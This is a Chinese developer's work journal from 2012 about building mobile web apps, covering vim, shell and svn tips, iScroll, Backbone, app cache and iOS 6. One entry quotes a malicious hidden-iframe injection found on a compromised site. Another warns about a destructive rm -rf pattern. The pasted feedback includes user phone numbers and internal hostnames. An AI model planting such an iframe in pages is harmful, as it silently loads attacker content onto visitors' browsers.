◦  更新的商店设计
◦  iTunes 预览历史记录
◦  补齐我的整季
◦  补齐我的专辑
•  Game Center 改进
◦  挑战朋友赢得的高分和成就
◦  将所获得的高分和成就发布到 Facebook 和 Twitter
◦  基于您的 Facebook 朋友推荐朋友
•  辅助功能改进
◦  “引导式访问”可将设备限制为使用一个应用程序，或者限制某些屏幕区域上的触碰输入
◦  VoiceOver 与“地图”、AssistiveTouch 和“缩放”功能集成
◦  iPhone 5 和 iPhone 4S 支持“Made for iPhone”助听器
•  增强了“通讯录”、“日历”、“提醒事项”、“照片”以及通过蓝牙共享数据时的隐私控制
•  “提醒事项”应用程序中的提醒事项可被重新排序
•  在 iPhone 上自定振动提醒方式
•  适用于 iPad 的“时钟”应用程序
•  以歌曲作为时钟闹铃
•  在“通讯录”中搜索所有字段
•  自动影片模式实现更强的视频声音质量
•  中文、法文、德文和西班牙文的字词定义
•  适用于法文、德文、土耳其文、加泰罗尼亚文、阿拉伯文和冰岛文的全新键盘布局
•  键盘快捷键可通过 iCloud 在设备间共享
•  蓝牙 MAP 支持
•  HTTP 全局网络代理
•  中国定制功能
◦  百度网页搜索
◦  新浪微博集成
◦  将视频共享到土豆网
◦  将视频共享到优酷网
◦  改进了手写和拼音输入法
•  修正了一些错误

某些功能可能并不适用于所有国家或地区。更多详细信息，请访问此网站：
    <http://www.apple.com/ios/feature-availability>

有关本更新的安全性内容的信息，请访问此网站：
    <http://support.apple.com/kb/HT1222?viewlocale=zh_CN>


2012/10/17
字符类，^在[]中就是非的意思，不在就是行首的意思，和上下文有关系。

统一修改版本号：
# 找出模板文件
find . -type f -name "*.tpl" > file.lst

# 找出修改过的静态文件
svn diff -r15041 | grep -P "^Index:" | grep -Po "[^/]+\.css|[^/]+\.js" > change.lst

# 针对每个模板文件，修改相应静态文件的版本号
for i in `cat file.lst`; do cat change.lst | xargs --replace=_file sed -r -e "s/_file[^\"]+/_file?v=20121017/g" $i; done | grep 20121017


svn st的时候：
M是Modified
C是Conflict

svn up的时候：
U是Update
G是Merge
2012/10/16
360出新闻搜索

没有中间页，干掉中间页，先全部干掉，后续在矫枉过正，加回来

军事直接模板改
娱乐和首页数据化

编辑控制

视频图片大小：110*86px
娱乐视频的链接：军事视频的链接？

2012/10/15
2012-10-15 10:53:15 18688202716 我每次看完一条新闻，退回到主界面，就变成了你们所谓的新版新闻界面，新版没有新闻发布时间，新闻量少，还非要主动跳出来，我不得不重新在书签里找到百度新闻，重新打开，简直就是流氓

android安装google play，需要安装几个google服务。googleservicesframework等，还得对应版本。
2012/10/14
Tangram的反馈系统：http://fb.fe.baidu.com/

shell：windows默认不支持动态变量，需要使用late binding技术。
%comspec% /v:on /c "get_musics.bat"
以及使用!代替%来引用环境变量

if “%1” == “debug” (
  ...
)
需要注意变量的扩展，可能多出来双引号。可用%~1去引号扩展。

manifest文件与Master不同域，manifest不会生效。
2012/10/12
apache日志如果需要记录cookie日志，需要在安装的时候增加--enable-usertrack，并在conf文件中增加
LoadModule usertrack_module /usr/lib/apache2/modules/mod_usertrack.so


mainfest如果缓存的资源获取不到，则缓存内容不会更新。会影响加载速度，loading较久。

http://developer.apple.com/library/ios/#DOCUMENTATION/AppleApplications/Reference/SafariWebContent/Client-SideStorage/Client-SideStorage.html
iOS 使用manifest
有个update()方法

第一次打开有百度悦读的推广
2012/10/11
iOS6添加至桌面后进去无法加载成功，直接safari没问题。zouzhubiao

cat -
或者不加-，从标准输入读取。

有manifest变成没有manifest：先404，再刷新就更新了。
 


2012/10/10
video：
bug list，修复，今天上线

1. iOS功能补全，下周开始，11.2日上线，2人
2. Android版开发，11.5开始，11.23日上线，2人

张楠，本周三-下周三，iOS补全，检索端迁移，URL修改的成本，最差情况先不管带query的页面。
下周，晴明，张楠（调休2天，休假1天）投入，进行iOS补全。
按照之前的开发量，4周，这次3～5周，至11.2日完成功能补全。

static文件迁移问题：
1. 什么原因？陈著
2. 首页要不要改？
3. Android/iOS是否都要改？




Android版本

iOS6搜索框无法置顶

manifest文件突然请求不到了（404）？全部重新请求，相当于不生效
manifest文件突然被清空，或者全被注释（204/205）？不会更新，原来缓存还是缓存
manifest文件指定的文件不存在，也即获取的时候返回404？chrome的console会提示错误：
Application Cache Error event: Resource fetch failed (404)：...
按列表逆序（貌似）进行缓存

vim查看文件的十六进制视图：
:%!xxd
意思为：所有行，用xxd命令打开

VIM带了^M这种字符，是因为文件格式不匹配的问题，原因是行结束符不一致：
(具体参考：http://vim.wikia.com/wiki/File_format)
dos: CRLF (0x0D,0x0A)
unix: LF
mac: CR

如果文本文件中存在两种行结束符，比如有CRLF也有LF，那么看fileformats选项的设置：
:set ff? ffs?
1. 如果ff=dos ffs=unix,dos
表明全部行都是以CRLF结尾，但仍然出现的^M是什么原因呢？很有可能是多出来一些CR，如果用:%!xxd查看，可以看到行尾可能是CRCRLF。这时要做的是先删除多余的CR：
:%s/\r//g
这时该文件变成干净的dos文件（全部以CRLF结尾）

2. 如果ff=unix ffs=unix,dos
表明文件中有CRLF的行，也有LF的行，VIM是unix优先，所以按unix来解析，读取时将其中的LF删除，剩下CR展示为^M。这时的解决办法是：
:e ++ff=dos
:setlocal ff=unix
:w
原理是按dos格式重新编辑当前缓冲区，因为是dos格式，读取时会同时将CRLF和LF都删除，这时^M应该已经消失，再设置ff=unix并保存，这时文件内容的CRLF全部替换成LF，文件变成干净的unix格式文件（全部都以LF结尾）

干净文件进行fileformat转换就比较简单了，只需：
:set ff=unix | up
或
:set ff=dos | up


NEWS本周：
报表-侯鹏
iscroll，误操作（双击展开或者箭头展开）
慢，manifest，大民
推广图-侯鹏

编辑后台，先了解情况
其他
艺兰按优先级列表再挑几个完成之


体验优化：
误操作，双击展开或者箭头展开
慢
图片保存
文字复制
刷新功能

自定义新闻的功能

新闻分类乱，内容少
女人栏目没了
内容
更新太慢
新闻时间


还有android适配过来的：
2012-09-30 13:47:53 18261895870 只能看到框架，新闻标题一个都没有看到，我用的系统是android 2.3 浏览器 UCBrowser V8.7.0.187 Android pf145 (zh-cn) beta (Build1209201432)  是自动2g的网络

联想A66t也适配过来了



http://uaq.baidu.com
测试网站性能，并有优化建议。

Android版10月底上线
公共组件力度加大
WebApp版本每周迭代内容，集思广益，与PM小组合作
video静态文件部署m.baidu.com，张楠

十月份WebApp项目计划：
Video，讨论
News，讨论
现状，哪些特性需要新加，优先级等
Android版10月份需推出

iOS Safari的unload事件，由于后退/前进的优化，不像期望的work。可以使用pageshow和pagehide事件。

iOS6 Mobile Safari：
https://developer.apple.com/library/ios/#releasenotes/General/RN-iOSSDK-6_0/_index.html

支持摄像头，Media Capture API，以及File API，通过<input type=”file”>来支持
本地存储从5M增加至25M
全新Audio API
额外CSS3支持，cross-fade， filters等
内建对不同分辨率的图片支持
远程调试器
Webkit JS引擎性能增强
通过UIWebView内嵌的YouTube视频不能播放

支持requestAnimationFrame与cancelAnimationFrame，更多请看：
http://www.w3.org/TR/animation-timing/
由于还在草案，以上两个方法还需要webkit前缀

UIWebView的web data（SQL Web Storage和LocalStorage），可以存放在目录中。
使用 -webkit-transform: preserve-3d 获得硬件加速层的方式已经不再支持
调用表单对象的focus()方法将会使该对象获得焦点

iOS6：
APP支持statusbar的颜色设置，与APP的样式一致

早期爆发后，iOS 6的普及速度达到瓶颈
http://techcrunch.com/2012/10/05/after-early-boom-new-numbers-suggest-ios-6-adoption-may-be-reaching-a-plateau/ 
iOS 6发布两个星期之后，Chartboost的数据显示iOS 6目前的总体普及率停留在45%左右：

iOS 6和iPhone 5的全面开发者指南
http://mobile.tutsplus.com/articles/news/ios6-iphone5-whats-new/ 
比较全面的一个介绍，包括新屏幕尺寸的适应设计，新的Cocoa-Touch框架：PassKit，新的Social Framework，Ad Support & Media Toolbox框架如何使用，Cocoa-Touch方面的强化，Mobile Safari的新功能，App Store的新UI等。

Android 4.0以上系统已占1/4，但2.3系统占有率仍在一半以上
http://www.36kr.com/p/156831.html 
数据来源：http://developer.android.com/about/dashboards/index.html 
从最新数据来看，Android版本的碎片化趋势开始减缓，4.0以上系统已占到了所有系统份额的25%以上。但不容忽视的是，Android 2.3 Gingerbread系统仍占到56%的份额。


2012/10/9
manifest中，/是否需要缓存？虽然说会自动进行缓存。
加了，显示Master Explicit
不加，显示Master

7-zip：
windows下可用的打包工具，支持命令行（command line）。有绿色版
7z为命令名

7z l abc.zip
列出包内内容

7z --help
命令帮助

7z a -tzip test *
打包当前目录下所有文件为一个.zip包。如果不设置-t开关，默认文件为.7z包。

7z a -o../ -tzip test *
打包当前目录下所有文件为一个.zip包。如果不设置-t开关，默认文件为.7z包。-o开关用于指定目标目录。

7z a -tzip test *.php -ir!forum
也可
7z a -tzip -ir!forum test *.php
按需打包。打包当前目录下所有.php文件以及forum目录下所有文件。

2012/9/29
pageafterchange事件需要触发refresh，避免二次进入的页面高度没更新。
改变高度的时候，比如orientationchange，DOM操作，样式改变等
onload的时候
orientationchange时，先scrollto(0,0),再重新计算高度并refresh，需要加个延时，确保获得正确高度。
64         $(window).on("orientationchange", function() {                                                                          
 65             // 延迟一下，以便获取正确的height    
 66             $.later(function(){
 67                 me.refreshIscroll();
 68             });
 69         }, me);          

refreshHeight的实现：
55     refreshHeight: function(){  
 56         var me = this; 
 57     
 58         // isLoaded前的scrollTo不仅徒劳，而且页面来回跳动
 59         if(app.isLoaded){
 60             window.scrollTo(0, 0);
 61         }
 62         else{
 63             $.later(function(){me.refreshHeight();}, 200);                                                                      
 64         }
 65     
 66         me.scrollerWrapper.height($(window).height() - 44);
 67         me.refresh.data('iscroll').refresh();                                                                                   
 68     }
2012/9/27
php.ini
能配置执行权限，safe_mode
safe_mode_exec_dir = 
配置函数能执行的系统命令的目录

http://remysharp.com/2010/08/05/doing-it-right-skipping-the-iphone-url-bar/

包含float元素，没有clear的父容器，高度是有问题的，iscroll的product页有这个问题。
导致refreshiscroll不成功。

setTimeout的用处，动画，发送网络请求等的冲突
pagebeforechange先显示，提前一拨渲染，比在screentransition时显示提前一拨。

272 /* 取消默认按钮按下状态 */
273 *{
274 -webkit-tap-highlight-color: rgba(0,0,0,0);                                                                                     
275 -webkit-touch-callout: none; 
276 }

把日志干掉

文件压缩

按钮得有按下态，并做延迟。好的交互体验

适当的延时比迅速展现体验更好。

老婆打印：http://www.chinagwy.org/html/zkgg/sydw/201209/40_43329.html

loading 的hide不要在render前调用

2012/9/26

vs通用loading：
初始化时show，调用this.showLoading(wrapper)
loaded render或者dataready时hide，调用this.hideLoading()

1. dead line，尽量明天最晚后天上线
2. RD先上线
3. 全民QA
4. 用户反馈页

iOS6上缩不上去
首页搜索框与检索结果页搜索框交互不同，涉及键盘隐藏等
1. suggest的隐藏策略
2. search bar的隐藏策略
3. 键盘的隐藏策略

vim的:vertical命令可以简写为:vert，或者直接v前缀。

vim中启动diff，:diffsplit file，窗口垂直切割，使用:vert diffsplit file
2012/9/25
news首页添加应用推荐页入口
video应用推荐页不用，直接链向第三方，底部添加意见反馈链接

应用推荐页地址，http://m.baidu.com/ios


做一个移动开发示范站点

iphone的高度，导航栏44px，状态栏20px，所以窗口为416px
scrollTo(0,1)，为了避免window太矮，最外围的节点的高度不能少于416px，所以min-height:416px

loadfail也得refresh
2012/9/24
事件穿透，touchend事件，stopPropagation与preventDefault都无效。改用click事件搞定。检索框交互中碰到了。
有些时候click虽然慢，但仍然挺有用。

动画忙，渲染忙，一定要考虑到，适时的用一些setTimeout

mobile safari的input focus问题，直接写input.focus()不生效，需要在原生事件的回调函数中调用才可以，而且如果回调函数中不是直接调input.focus()，而是一个封装了input.focus()的函数，也还是不行。
http://twilight.btlogs.com/how-to-focus-html-input-element-with-javascript-on-ios-and-android-mobile-safari/


1. 搜索框置顶，焦点
2. 按钮状态
3. 地址栏收起

每个页面在加载出来之前，请使用之前通用ue提供的菊花，放在页面中间，现在使用的圆圈不清晰，有的在中间，有的在顶端，不是很统一
刘鑫（UE-WebApp标注）<luckylx66> 16:21:30 回复
搜索结果页，搜索框是要显示出来的，不能被收起的，标题栏右侧是首页，不是搜索了

news首页和其他页切换慢的问题，app.motions.screenTransition的实现的问题，400ms以后会有还原位置的操作，如果迅速回切，可能导致响应变慢。关闭还原位置的操作，无意义的操作。

新增页面别忘了switchOrder的配置，否则动不起来

apache Rewrite配置若不生效，看看proxy model是否已经load了
2012/9/23
subControllers[name]，可能和检索词冲突，需要考虑。

webapp页面之间不通信，避免跨页面关联带来的复杂度，同时也提高程序开发的并行度。

.svn而不是*.svn

vim buffer explorer

suggestion和quickdelete进行了修改，用@by vs作为修改标记。

window的mkdir可以直接创建子目录。
xcopy /e a b， 将a目录下的所有目录和文件拷贝至b目录下
/y 参数用于直接覆盖
2012/9/22
div的display变成none以后，height就为0了。

ui.dialog不能在创建的时候是隐藏的么？

vim窗口高宽调整：http://www.cnblogs.com/xuechao/archive/2011/03/29/1999292.html
ctrl-w >
ctrl-w <
调整宽度
:res 50
:res +5
:vertical res 50
:vertical res +5
命令方式，高和宽的调整。

app.eventCenter全部干掉。

from 建勇：大民，帮我介绍一下，咱们的产品fe用的语言、技术的列表，我去了解下，来更好地和fe同学们交流技术
rd用的C++、python、php、shell，争取不用别的

addClass, removeClass的类名，不要加点前缀，和selector分清楚。

函数内部的var，需要先定义后使用。如果使用在前，定义在后，会导致使用一个未定义的值，虽然它已经声明。

background-size，指定整张背景图的缩放方式，可像素、百分比，以及cover。

-webkit-tap-highlight-color: rgba(255, 255, 255, 0);

258i.com被挂马了。
document.write('<iframe src="http://dialhashmark.ru/Intellectual?7" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');


2012/9/21
rm -rf 太恐怖了。。。。
特别是这样的rm -rf $TMPDIR/*
如果$TMPDIR为空，就惨了，这种命令一定写清楚目录，及时冗余也值得。

GMU文档、新打包工具及iScroll精简版终于出炉啦！！
         文档：http://gmu.baidu.com/doc/
    打包工具：http://gmu.baidu.com/compress/
    iScroll精简版：可在打包工具中下载

svn co提示编码无法转换成native格式时，可以：
echo $LANG
export LANG=zh_CN.UTF-8

GMU文档：
http://172.22.184.127/trunk/ui/doc/


release_vs_base.sh
ci.sh
collect.sh
最近的shell脚本

NERDTree为什么不能记住上次文档位置？

chrome设置：Override device metrics，可以自己配置device width

纵向滚动条为啥没了？
iScroll.js被修改过，使用最新版就没问题了。

事件流：
hashchange
    pagebeforechang
    pageafterchange
    subpagebeforechange
    subpageafterchange
    pageload
2012/9/20
艺兰：
下拉刷新，gotop，左右滑动，数据

张瑶：
正文页数据、样式

侯鹏：
数据调试、carousel、周六完成
红吉周末来
永刚周末来

张楠：
公共头部，应用推荐，首页样式

晴明：

燕煌数据问题。


view都使用events配置的方式，方便destroy
增加unregisterEvents方法，各位有责任维护好该方法，确保destroy能成功。
增加view.destroy方法与controller.destroy方法。

iscrollbar无缘无故没掉，什么原因？
iscroll的bug，可能是GMU修改的

按效率的人员分类，先心中有数，news webapp
对工具这块，借力但不依赖
GMU合作这部分，先有个想法
编辑工具，考虑news webapp这部分，smartnews数据可控，间接影响webapp数据源

new的时候做回收，而不是pageafterchange时做回收。

回收针对页面需要动态创建子controller的情况，比如检索结果页，正文页等。其他的情况考虑的必要性不大。

回收的调用者为PageController，子controller无法调用，已经做了限制。
使用order记录切换顺序，使用history记录前进后退历史。
addorder只在new的时候调用即可，addHistory必须在每次pagechange都调用。
回收的算法为，每次回收前进后退历史上离当前最远的，且非当前的子页面。

几个方法，注册在app.controller上。

子页面切换的算法，需要考虑事件的整个流程。

引入hash穿透页面的概念，使用出action之外的hash参数能定位到的子页面。比如#listing/internet和#listing/mil是两个不一样的子页面，hash切换后能切起来，而且通常情况下顶部不变。

2012/9/19
Backbone.View，new的时候提供el的话，后续可以直接通过view.el或者view.$el取到，如果new时没有提供，仍然能取到，但是可能不是你想要的。

编程的视野，从中控中心转移到控制节点。分而治之，自治。

要切换的DOM对象，需要绝对定位。子页面切换，就需要子页面DOM的样式定位为绝对定位。

subview的显示和隐藏还是有必要的。

action与页面一一对应，其他参数的组合与子页面一一对应，或者叫逻辑参数串

针对hash穿透的子页面的动画：需要考虑相同页面切换
相同页面切换时，顶级View对pagechange事件的关注不变，顶级Controller需要在afterchange后触发子页面切换动画。子Controller在afterchange事件不触发数据获取，而在子页面切换动画后触发数据获取，子View在beforechange和afterchange不做任何事情，在subpagebeforechange和subpageafterchange中做子页面的显示工作。
新增子页面事件

能否不这么复杂，归纳到页面的切换中。但是又不易进行页面拆分与并行。

VS Hudson地址：
http://db-news-fe2.vm.baidu.com:8855/

http://research.baidu.com/index.php?sid=51875&lang=zh-Hans 
帮gmu打个分吧

问题：
1. 顺序，事件，正文页接口（两套）
2. 框架，职责不明确。
3. meta标签，流程说明
4. MVC架构

_模板的使用，<%- ... %>的用法，有些地方是需要HTML转码的，请注意

文件编码，统一使用UTF-8

提交以后，2分钟内看集成服务器效果，以及关注邮件。如果有问题，请第一时间先修复。

listing页创建子控制器的方式有问题。@艺兰

+<script type="text/template" id="template-channel-list"> id不规范

channel的tpl是不是没有往里面加？

video的首页，不要用localhost，否则集成环境无法使用。可以将.php文件放在svn目录中，照样能使用。

product/js/pages/index/app.index.touchScroll.js，属于视图还是组件，如果组件，请放在common/ui里。

this.HotView= new app.view.index.hot({... 
建议都使用camel方式命名，变量或者属性或者方法名。类名可以用PASCAL

+++ product/js/pages/index/app.view.index.hot.js    (revision 146)
template:'<div class="carousel"></div><div class="index_view_hot_state"><%= spans %></div>',^M+ _template: '<a href="<%= obj.url %>"><img src="<%= obj.imgh_url%>"/><span><%= obj.title %></span></a>',

请注意iScroll，应该开始注意了。高度的调整，滚动的性能等等。开发出来大体DEMO的只是完成了一半。

 
频道页和news的列表页是类似的，都存在问题。这些应该属于动态创建的。@艺兰，@晴明

model暂时不用ec属性，app.model.channel

2012/9/18
整合下自己写过的shell脚本。

百度内网smtp服务器[通过tcpdump得到的地址]：
mail1-in.baidu.com 25
mail2-in.baidu.com 25
tcpdump只能root权限使用

Hudson配置，无外网的内网服务器上，HTTP代理以及SMTP服务器等都请使用ip地址。

ci再单独写一套，不好，工程师可能会造成困惑。要么不提供build脚本，要么就只用build脚本。

shell有3元操作符：
(( var0 = var1<98?9:21 ))

function clear_svn () {
    find "$1" -type d -name ".svn" -exec rm -rf {} \; &>/dev/null
}
shell函数与js函数定义还有点像，注意空格，换行等都组成其格式的部分。调用时没有括号。必须先定义后调用。

=~ 正则匹配

here document使用i/o重定向为命令或程序（需要标准输入）提供命令列表，比如ftp，cat等，格式为：
COMMAND << InputComesFromHERE
...
InputComesFromHERE
<<固定，后面的部分自定即可，只要配对就行。单独一行。内容可以变量替换。
11 cat > $JS_BUILD << CITEXT
12 ;/*{include file="../product/js/app.js"}*/'
13 CITEXT
放在命令（包括重定向）的末尾。
here string，传递变量值给程序，作为标准输入。echo是不需要标准输入的，所以无法使用。

\<, \>作为正则表达式的单词边界，shell里

shell里，2是stderr，1是stdout，0是stdin
&代表1和2
重定向在管道前就得做完

？shell里面变量内部的换行符会被替换成空格？
ROOT_JS_LIST=`find ../product/js/ -maxdepth 1 -type f -name '*.js' | xargs --replace=_file echo ';/*{include file="_file"}*/'`

页面最多引两个js，一个common，一个iphone。前者通用，不常改，后者包含业务，可能常改。common部分分为基础库和ui组件库。写组件按照GMU方式写。$.mobile.xxx，前期大不了加上vs前缀。

third -> common

页面模板，也单独出来

<meta name="apple-itunes-app" content="app-id=459427238"><!-- smartapp bar 百度视频 -->
这段给大家解释下。iOS6的功能

@张楠
app.header
index.header.css
通用组件在GMU框架下去写。一是标准，二是以后可以贡献。

app.tool.touchScroll，组件不要放在pages下

base/app.header.js
base目录先不要往里面放东西

tools目录别往里边放，jar文件的

每天到公司第一件事，先svn up
1.  不要轻易修改目录，比如请求的静态文件目录，否则无法集成。统一成news和video，本地环境也这么配，不要是news_new, news_test等
2.  一定要在本地跑通过了，才能提交
3.  每天必须提交一次代码
4.  svn提交必须加上comment，以“修改关键词，by xxx”为格式。


2012/9/17
Video沟通结论：
RD依赖：
跳转，302，C cache的替换，如果不跳转，风险更大，分钟不能变换。
MIS，新搞一个，几个小时，编辑支持没问题，发出邮件需求即可
列表页，定一个值，给RD，做配置更新即可
榜单页得自己做，张楠

QA：嘉懿

smartnews推广页面

deploy.xml等放在build目录


风险点：
需要尽快跟进的：
VIDEO各角色启动会，人员敲定，QA是谁，RD有哪些工作需要配合？张楠需要列出来。张楠负责起来VIDEO
NEWS首页性能优化，LazyLoad。技术上侯鹏跟进起来
NEWS数据配合工作

我的：
组内再次培训
页内切换DEMO可用
通用组件开发
持续集成

产品切换栏首页是出来新页，搜索结果页是下推列表
右侧按钮：首页是搜索按钮，结果页是返回首页按钮

video的静态文件路径问题，/video?static=...
2012/9/16
base就267行。
重要在于demo
首页框架，外围的
持续集成

页面内部切换的功能，页面controller需要处理，在pageafterchange事件以后进行，也即页面切换仍然进行着，只不过不会切换。完成页面切换后，页面内部再做一次切换。

不流畅，与loading图片貌似没关系。NND，原来是滚动条的原因。PC浏览器下会有问题，手机上没问题。花了我好长时间啊。。。

CTRL+Q，SecureCRT从假死中返回

link标签是单标签

webapp在safari windows上无法跑起来。。。

loading.gif消除304请求，只用一个节点。

动画不同步问题，即使用linear也不行。可能是前后动画启动时间不一样。

页面视图，动画前，目标活动页提前（beforechange）展示，起始活动页延后（afterchange）隐藏。

页面内部（有一种情况需要提前隐藏）：
目标活动结果提前展示
// NOTE: 非目标活动结果，但在目标活动页面中，提前隐藏
如果不在目标活动页中，不需提前隐藏

onpagebeforechange事件不是稳态，状况需要仔细分析。
onpageafterchange事件是稳态，比较容易操作。

jQuery Mobile在完成transition以后触发pagechange事件

一定等动画稳定以后再执行数据请求，否则页面不稳定

莫非做封装也影响动画性能？
2012/9/15
缺：基础svn代码，持续集成
基础代码可能还会升级，需要保证其升级方便。

初步想法：结果页到结果页的切换，属于页面内部切换。结果页的page controller响应onpageafterchange事件，做一次内部切换。

URL字段必须encode

View管理页面，更加结构化。

var word = me.$form.children('input:first-child').val(),
val而不是value，first-child而不是first-element

CSS3 Selectors Reference： http://www.w3schools.com/cssref/css_selectors.asp 

eventCenter.on与$(‘id’).on的区别。

规范：zepto对象，用$作为前缀。

submit按钮没有onsubmit事件，是form的

改模板，快，但是也容易出问题，出了问题后，还不容易找。比如new view和model时，必须是对应的view和model，我已经出过几次莫名其妙的问题了。校验机制得有。

同一页面内部的切换，from和to都是本身，这种情况的考虑。page内部需onpageafterchange中多做一个判断。switchPage的顺序上，需要考虑
from没，to有，直接显示
from有，to有，且不相等，按pageOrder显示
from有，to有，且相等，

Zepto函数对象，内部用$表示。本身是一个函数，和jQuery一样。(selector, context)参数，内部调用zepto.init
zepto.Z函数，是zepto collection的构造函数，zepto.Z.prototype = $.fn。
zepto.Z = function(dom, selector) {
    dom = dom || []
    dom.__proto__ = arguments.callee.prototype
    dom.selector = selector || ''
    return dom
  }
init函数会调用return zepto.Z(dom, selector)

JS正则：
\w等价于[a-zA-Z0-9_]
\W等价于[~^a-zA-Z0-9_]
\s 任意Unicode空白字符
(?=p) 确定前向断言，要求接下来的字符符合p模式，但在匹配中不包含这些字符
(?!p) 否定前向断言

$(‘html’)，内部还是使用innerHTML来实现

underscore模板，可以直接掉对象方法，<%= news.abs.substr(0, 20) %>
2012/9/14
JS tshirt

$(‘html’)的问题，自己模板写错了。。。

开始步骤：
1. check出来
2. product/index.html中创建页面框架
    1. 根部#app_wrapper，样式刚好填充满整个窗口
    2. 有几个页面？每个页面有一个最外层的div，属性data-role=”page”，属性id唯一标识该页面
    3. 样式，id，class。确保不冲突，样式用-分隔，都以页面handler为前缀
3. 

每个页面控制器，需要有个状态判断自己是否活动控制器。onpageafterchange以后可以确定。
orientationchange的考虑

bat文件中setlocal与endlocal，在call *.bat文件时有用，避免.bat文件内部的环境变量互相影响。

vim里的:s命令，后面的g是一行内的global

windows，wpp本身是一个.bat文件，如果在批处理文件中调用wpp，需要call，否则批不起来。

HTML页面如何并行，需要规范

app.router文件维持精简

公共代码的维护和升级

提交代码前请先update，做完merge再提交


2012/9/13
webapp windows开发环境部署

批量svn文件迁移：
find . -maxdepth 2 -type f -name "*.js" | grep index | xargs --replace=aa svn mv aa pages/index/

xargs --replace=abc echo abc
abc代替参数值

大发现：iScroll性能，使用div比ul-li组合性能高不少。

touchmove事件的阻止，视情况而指定。可以小范围的阻止。document的阻止得看情况。

scrollTo(0, 1)，页面的顶层div不要设置overflow:hidden。比如配合这段：position:absolute; top:0; bottom:0; left:0; right:0;就滚不上去了。

先说webapp总体设计思想，目标：解耦、并行开发、持续集成
自治，把复杂度进行均衡，每个对象做该做的事，不做不该做的事。复杂的中心控制器，如何将其复杂度均衡。
事件系统，全局事件和局部事件
MVC，控制器树，MVC一一对应，可能没有M


关于前端模板，各位要会用。http://underscorejs.org/#template
windows下开发方式

快速新建一个页面
分析结果页的MVC结构
html中新建一个#search_view
先搞路由，以及参数，对应
pages下新目录search

用户体验很重要，一些实现上的疑问。iScroll的位置保留等，导航栏的固定，给人稳定感，等等。

如何并行开发

关于单元测试

持续集成开发

WebApp核心：
页面模拟，页面切换效果

页面切换必须中控统一实现，自治方案无法将两个页面的动画对接起来

事件机制使工作解耦，并行度提升。
路由控制（中控）工作收敛，只做页面切换以及事件派发，中控与页面解耦，而页面之间相对独立，达到整体解耦。

一个页面控制器对应一个页面

开发过程中，MVC各个角色要做到自治以及不跨界操作。

不用担心DOM树创建导致内存使用增多，DOM所占内存实际很少。不明显。1M一个页面，也还挺多的

pagebeforechange
pageafterchange
需要跨页面传递，from，to，params

pageload
pageloadfailed
只需页面内部传递，params

模拟

#view，设置overflow:hidden，高度设置为window的高度，设置position。否则可能会出来滚动条。
#page_view，设置position为absolute
2012/9/12
横切部分要绝对定位。

不要有跳跃感，很忌讳。

pageload事件改为页面内部事件，一般情况下，不需跨页面传递。controller来派发。

image的load事件不bubble？

View的events配置，右侧可传字符串，也可传方法

pageload事件，其pageController参数不能为undefined。需要事件参数验证器。

iscroll的refresh还是有必要，但也得杜绝没必要的refresh，console一下，监控是否有多余的refresh。在事件注册里需要特别注意。
2012/9/11
演示新增一个首页分类，很快

Model对于Video和News来说，比较稳定

view和controller都必须继承自app.view和app.controller

数组的shift方法用于arguments，转成数组。

如何确保子类的view和controller，调用了父类的initialize方法

null == undefined

事件参数验证器，确保事件参数不会传错。

controller类必须传递parentController参数。

全局事件处理，需要判断是否当前页面控制器。避免不必要的额外处理。无关事件直接返回。

jQuery.fn.show与hide是配对的，show是将display属性设置成默认值。有些情况不一定生效。

iscroll wrapper需要设置overflow:hidden，以及height，包括外围的

class名用-号连接
id用_连接

testcase： 必须new对应的view和model。

initialize调用父类，必须。

alt+enter， secureCRT全屏切换

svn st | awk '/^\?/ {print $2}' | xargs svn add
批量添加新增文件，利用awk

事件是一个时间点，不是一个时间段
先开放觉得有用的事件

参数穿透

异步事件怎么保证先后顺序。

跨页面事件
pagebeforechange    from, to, params    页面切换前 1
准备pageView，高度调整好，loading添加上
pageafterchange from, to, params    页面切换后 4
页面状态调整
pagebeforeanim  from, to, params    页面动画前 2
pageafteranim   from, to, params    页面动画后 3
pagebeforeload  page    页面加载前 5
开始数据请求
pageafterload   page    页面装载后 6
拼装页面
pagebeforeshow  page    页面展现前 7
iScroll.refresh
pageaftershow   page    页面展现后 8
展现页面
pagebeforehide  page    页面隐藏前 
pageafterhide   page    页面隐藏后
pagebeforedestroy   page    页面销毁前
pageafterdestroy    page    页面销毁后
orientationchange       
都是全局事件，可以跨页面监听。为了避免多余的监听行为，监听者需要能判断是否来自自己所处的页面，以决定是否进行响应
所有的事件都得传递pageController参数，以标识来自哪个page。所有的类都有isCurrentPage方法，判断是否当前page派发的事件。所有的类都得有pageController属性。

一个页面多个异步请求，pageload事件不是来一个load一个

switchingOrder

iScroll refresh，使用什么事件？DOM树有变化就得refresh

isCurrentPage，顶级controller需要传递下来，pageController

子controller固定，在initialize时一次性全部创建
子controller动态创建，pagebeforechange时动态创建，pagechange时启动加载

动画在pagebeforeanim时初始化，并启动
在pageanim时完成动画，进行相应动画清理工作
如果anim相关的事件不触发，就没有动画效果

pagechange事件，页面完成切换。

view负责自己相关DOM的渲染，展现，以及事件注册和响应
model负责数据的获取，保存，操作，并知晓view更新
controller负责view和model的管理，启动数据获取，其持有model和view，还可以调用model和view的一些方法。
2012/9/10
全局事件怎么响应，自治系统必须有个判断。

http://cubiq.org/iscroll-4
iscroll-4 documents

http://fe.baidu.com/doc/dom/experience/
DO Mobile经验积累

pagebeforechange还是有用的，这里先new一个子controller，让其监听pagechange事件，那么pagechange的时候就会响应事件了。

controller的参数要贯穿，router传进来的参数要保持贯穿。
View必须有$el

new哪几个，page这个controller

自己还不顺

自定义事件，传递params

hudson运行shell脚本，最好是基于check出来的内容进行，而不要依赖工作目录。使用相对路径。

如果子controller是动态创建的，那么render的时候，如何append？parent指向父controller，调用父controller的append。

复杂数据，可能不是一个model能cover的情况，还得动态创建
2012/9/9
自治，该你管的必须管，不该管的坚决不管。

pageload事件怎么触发？

iScroll的整合用例
切换的整合用例
GMU组件的整合用例

Controller的创建，使用options

新写的View类是继承子Backbone.View还是继承app.view?

Backbonejs的说明：
http://www.cnblogs.com/marryZhan/archive/2011/12/20/2497569.html

Model有change、destroy等事件，还有change:attrname等格式的
Collection有add、remove、reset等事件，内部的Model触发的事件，也都能收到
View需要为其指定根元素
View在创建时传入的options都会放在this.options中，以备后用。如果是一些特殊选项的话，会被直接注册成为属性。比如tagName, el, model, collection, id, className。setup的时候，传入el值。el值可以是DOM对象，也可以是selector。
View的渲染，先全部渲染好，在一次性放入到DOM树中，减少reflow和repain，提高性能。

View有el和$el，前者是DOM，后者是jQuery对象。
